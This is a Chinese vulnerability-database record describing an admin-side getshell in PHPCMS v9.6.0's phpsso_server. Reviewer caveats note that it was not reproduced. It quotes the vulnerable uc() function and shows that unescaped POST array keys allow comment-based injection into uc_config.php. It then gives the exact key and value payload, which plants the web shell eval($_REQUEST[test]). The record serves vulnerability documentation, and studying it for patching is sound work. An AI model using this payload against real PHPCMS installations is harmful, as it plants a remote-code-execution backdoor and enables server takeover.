---
source: "hatch 补库批 20260928"
product: "PHPCMS9.6.0 PHPSso server"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Phpcms v9.6.0后台getshell"
prerequisites: "来源所述条件，未列明部分仍待核：PHPSso后台UCenter配置权限，uc_config.php可写及被执行"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-5d415cee81b2cf15065bdc3e"
entity_id: "ve-5d415cee81b2cf15065bdc3e"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：PHPSso后台UCenter配置权限，uc_config.php可写及被执行

- **适用与权限边界（1）**：后台是PHPSso而非一般PHPCMS管理界面，应单独标认证域。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（2）**：POST数组key未转义/value被转义的差异分析明确；缺完整endpoint及缓存更新触发请求。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **实验改动边界（3）**：代码strtoupper作用key，payload用注释跨key/value需要保留，不能简单当value单引号注入；旧PHP裸test常量依赖。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Phpcms v9.6.0后台getshell

一、漏洞简介
------------

phpsso\_server 后台getshell

二、漏洞影响
------------

Phpcms v9.6.0

三、复现过程
------------

漏洞来自于ROOTDIR/phpsso\_server/phpcms/modules/admin/system.php

    public function uc() {
            if (isset($_POST['dosubmit'])) {
                $data = isset($_POST['data']) ? $_POST['data'] : '';
                $data['ucuse'] = isset($_POST['ucuse']) && intval($_POST['ucuse']) ? intval($_POST['ucuse']) : 0;
                $filepath = CACHE_PATH.'configs'.DIRECTORY_SEPARATOR.'system.php';
                $config = include $filepath;
                $uc_config = '<?php '."\ndefine('UC_CONNECT', 'mysql');\n";
                foreach ($data as $k => $v) {
                    $old[] = "'$k'=>'".(isset($config[$k]) ? $config[$k] : $v)."',";
                    $new[] = "'$k'=>'$v',";
                    $uc_config .= "define('".strtoupper($k)."', '$v');\n";
                }
                $html = file_get_contents($filepath);
                $html = str_replace($old, $new, $html);
                $uc_config_filepath = CACHE_PATH.'configs'.DIRECTORY_SEPARATOR.'uc_config.php';
                @file_put_contents($uc_config_filepath, $uc_config);
                @file_put_contents($filepath, $html);
                $this->db->insert(array('name'=>'ucenter', 'data'=>array2string($data)), 1,1);
                showmessage(L('operation_success'), HTTP_REFERER);
            }
            $data = array();
            $r = $this->db->get_one(array('name'=>'ucenter'));
            if ($r) {
                $data = string2array($r['data']);
            }
            include $this->admin_tpl('system_uc');
        }

来自这段中的

\$data = isset(\$\_POST\[\'data\'\]) ? \$\_POST\[\'data\'\] : \'\';

和

foreach (\$data as \$k =\> \$v) {\$old\[\] = \"\'\$k\'=\>\'\".(isset(\$config\[\$k\]) ? \$config\[\$k\] :
\$v).\"\',\";\$new\[\] = \"\'\$k\'=\>\'\$v\',\";\$uc\_config .= \"define(\'\".strtoupper(\$k).\"\', \'\$v\');\\n\";}

这里接收post\[\'data\'\]数据中的key，value并写入配置文件ROOTDIR/phpsso\_server/caches/configs/uc\_config.php中

在ROOTDIR/phpcms/libs/classes/param.class.php中

    public function __construct() {
            if(!get_magic_quotes_gpc()) {
                $_POST = new_addslashes($_POST);
                $_GET = new_addslashes($_GET);
                $_REQUEST = new_addslashes($_REQUEST);
                $_COOKIE = new_addslashes($_COOKIE);
            }

全局过滤了post，但是这里只过滤了value，并没有过滤key

![](./.resource/Phpcmsv9.6.0后台getshell/media/rId24.png)

在这个地方，我们可以构造

    name="data[uc_api','11');/*]"

并在Ucenter api 地址输入:

    */eval($_REQUEST[test]);//

再进行缓存更新

![](./.resource/Phpcmsv9.6.0后台getshell/media/rId25.png)

就成功写入了一句话

![](./.resource/Phpcmsv9.6.0后台getshell/media/rId26.png)

![](./.resource/Phpcmsv9.6.0后台getshell/media/rId27.png)
